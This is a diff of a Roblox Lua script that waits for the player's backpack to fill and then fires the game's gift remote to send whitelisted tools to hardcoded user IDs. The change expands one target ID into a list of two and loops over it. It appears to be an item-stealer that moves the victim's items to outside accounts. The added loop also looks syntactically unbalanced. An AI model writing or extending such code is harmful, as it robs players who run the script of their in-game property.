@@ -15,8 +15,11 @@ repeat task.wait() until player:FindFirstChild("Backpack")
 local backpack = player.Backpack
 repeat task.wait() until #backpack:GetChildren() > 0
 
--- CONFIG
-local targetUserId = 9367836539
+local targetUserIds = {
+    9367836539,
+    9456150015
+}
+
 local giftRemote = ReplicatedStorage.Shared.Packages.Network.rev_GiftRequest
 local weightFolder = ReplicatedStorage:WaitForChild("Objects"):WaitForChild("WeightModels")
 
@@ -389,7 +392,8 @@ task.spawn(function()
                 task.wait(0.02)
 
                 if isWhitelisted(tool) then
-    giftRemote:FireServer(targetUserId)
+    for _,id in ipairs(targetUserIds) do
+    giftRemote:FireServer(id)
 end
 
                 unequipAll()
